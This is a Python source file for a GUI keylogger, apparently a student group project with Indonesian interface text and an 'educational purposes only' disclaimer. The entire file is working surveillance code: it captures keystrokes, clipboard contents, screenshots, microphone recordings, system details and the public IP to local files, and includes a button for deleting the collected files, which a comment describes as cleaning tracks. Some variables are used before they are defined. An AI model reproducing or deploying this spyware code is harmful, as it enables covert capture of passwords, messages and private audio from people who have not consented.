#Keylogger.py
#NOTE: This code is for educational purposes only. 
#Any material within this code is intended for educational and only used for ethical purposes.
#Author: Grant Collins
#Edited code by Ismail Wafi Khoerul Abidin

import socket
import platform
from requests import get

import win32clipboard

from pynput.keyboard import Key, Listener

import os
import os.path
from os import path
import pathlib

from scipy.io.wavfile import write
import sounddevice as sd

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

import tkinter as tk
from tkinter import *
from tkinter import messagebox

keys_information = "key_log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

microphone_time = 10

key = "3"

file_path = ""
extend = "\\"
file_merge = file_path + extend

text1 = "Selamat datang di Keylogger Kelompok 2\n\nCara Penggunaan Aplikasi\n"
text2 = "1. Silahkan input folder path untuk menyimpan file, setelah itu tekan Enter atau klik tombol Save.\nContoh input folder path (C:\\Users\\User)\n\n2. Fitur Start digunakan untuk menjalankan keylogger. Untuk memberhentikannya, Anda bisa menggunakan tombol ESC pada keyboard Anda.\n\n3. Fitur Clipboard digunakan untuk menyimpan sementara hasil copy-an.\n\n4.Fitur Screenshot untuk mengambil gambar pada layar Anda.\n\n5. Fitur Info IP Addreess untuk mendapatkan informasi Public IP Address sesuai dengan perangkat yang sedang digunakan.\n\n6. Fitur Record Sound untuk merekam suara selama 10 detik\n\n7. Fitur Delete Files untuk menghapus seluruh file yang ada pada aplikasi ini sesuai dengan path.\n\n"
text3 = "Selamat mencoba! Semoga membantu."

def on_closing():
    if messagebox.askokcancel("Quit", "Do you want to quit?"):
        root.destroy()

def about_help():
    filewin = Toplevel(root)
    texts1 = Label(filewin, text=text1, justify=CENTER, wraplength=470)
    texts2 = Label(filewin, text=text2, justify=LEFT, wraplength=470)
    texts3 = Label(filewin, text=text3, justify=CENTER, wraplength=470)
    texts1.pack()
    texts2.pack()
    texts3.pack()

# Untuk mengisi path
def set_fol(event=None):
    global file_path
    global file_merge
    file_path = entry.get()
    file_merge = file_path + extend
    if file_path == '':
        print("The value is not valid")
    else:
        print("The value is valid")
        print(f"{file_path} Selected")
    
# Untuk mendapatkan informasi komputer
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + '\n')
            print("Public IP Address gotten")

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)" + '\n')
            print("Don't get Public IP Address")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")
        print(f"{file4} Saved")

# Untuk mendapatkan isi clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)
            print(f"{file2} Saved")

        except:
            f.write("Clipboard could be not be copied")

# Untuk mendapatkan rekaman suara
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)
    print(f"{file5} Saved")

# Untuk mendapatkan gambar layar
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)
    print(f"{file3} Saved")
    
# Untuk mendapatkan keylog(keystroke)
count = 0
keys =[]
def run(event=None):
    root.withdraw()
    for widget in entry.winfo_children():
        widget.destroy()
        
    def popup():
        messagebox.showinfo("Info", "Keylogger is running!\nNow you can press any keys\n\nPress 'esc' to stop running")

    def on_press(key):
        global keys, count

        print(key)
        keys.append(key)
        count += 1

        if count >= 1:
            count = 0
            write_file(keys)
            keys =[]

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        
    with Listener(on_press=on_press, on_release=on_release) as listener:
        print("Start")
        popup()
        listener.join()
        root.deiconify()
        print(f"Stopped. {file1} Saved")

# Untuk membersihkan tracks dan menghapus file
def delete_file():
    global file1, file2, file3, file4, file5
    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
    for files in delete_files:
        file1 = pathlib.Path(file_merge + "key_log.txt")
        file2 = pathlib.Path(file_merge + "clipboard.txt")
        file3 = pathlib.Path(file_merge + "screenshot.png")
        file4 = pathlib.Path(file_merge + "syseminfo.txt")
        file5 = pathlib.Path(file_merge + "audio.wav")
        if file1.exists(): 
            os.remove(file1)
            print (f"{file1} was deleted")
        elif file2.exists():
            os.remove(file2)
            print (f"{file2} was deleted")
        elif file3.exists():
            os.remove(file3)
            print (f"{file3} was deleted")
        elif file4.exists():
            os.remove(file4)
            print (f"{file4} was deleted")
        elif file5.exists():
            os.remove(file5)
            print (f"{file5} was deleted")

        else:
            print ("File not exist")
            
#Tkinter Code
root = tk.Tk()
root.title("Kelompok 2")
root.geometry("390x150")
root.configure(background="#295929")

#Menu
menubar = Menu(root)
helpmenu = Menu(menubar, tearoff=0)
helpmenu.add_command(label="About", command=about_help)
menubar.add_cascade(label="Help", menu=helpmenu)

#Label
label = tk.Label(root, text="Keylogger's", bg="#295929", fg="white", font=("Acme", 12))
label.grid(row=0, column=2)

label2 = tk.Label(root, text="Enter Folder Path: ", bg="#295929", fg="white")
label2.grid(row=1, column=1, columnspan=1)

#Entry
name = StringVar(root, value="C:\\Users\\User")
entry = tk.Entry(root, bd= 3, textvariable=name)
entry.bind('<Return>', set_fol)
entry.grid(row=1, column=2, columnspan=1)

#Button - Save Path
save = tk.Button(root, text= "Save", fg="white", bg="#05a60a", command= set_fol)
save.grid(row=1, column=3, sticky=W, padx=3, pady=3)

#Button - Start
start = tk.Button(root, text= "Start", padx= 10, pady= 5, fg="white", bg="#263D42", anchor="center", command=run)
start.grid(row=2, column=1, columnspan=1, sticky=W+E)

#Button - Clipboard
clipboard = tk.Button(root, text= "Clipboard", padx= 10, pady= 5, fg="white", bg="#263D42", command=copy_clipboard)
clipboard.grid(row=2, column=2, columnspan=1, sticky=W+E)

#Button - Screenshot
screenshot = tk.Button(root, text= "Screenshot", padx= 10, pady= 5, fg="white", bg="#263D42", command=screenshot)
screenshot.grid(row=2, column=3, columnspan=1, sticky=W+E)

#Button - IpInfo
ip_info = tk.Button(root, text= "Info IP Address", padx= 10, pady= 5, fg="white", bg="#263D42", command=computer_information)
ip_info.grid(row=3, column=1, columnspan=1, sticky=W+E)

#Button - Sound Record
sound_record = tk.Button(root, text= "Record Sound", padx= 10, pady= 5, fg="white", bg="#263D42", command=microphone)
sound_record.grid(row=3, column=2, columnspan=1, sticky=W+E)

#Button - Delete Files
delete_file = tk.Button(root, text= "Delete Files", padx= 10, pady= 5, fg="white", bg="#940707", command=delete_file)
delete_file.grid(row=3, column=3, columnspan=1, sticky=W+E)

root.config(menu=menubar)
root.protocol("WM_DELETE_WINDOW", on_closing)
root.mainloop()

#Stay Healthy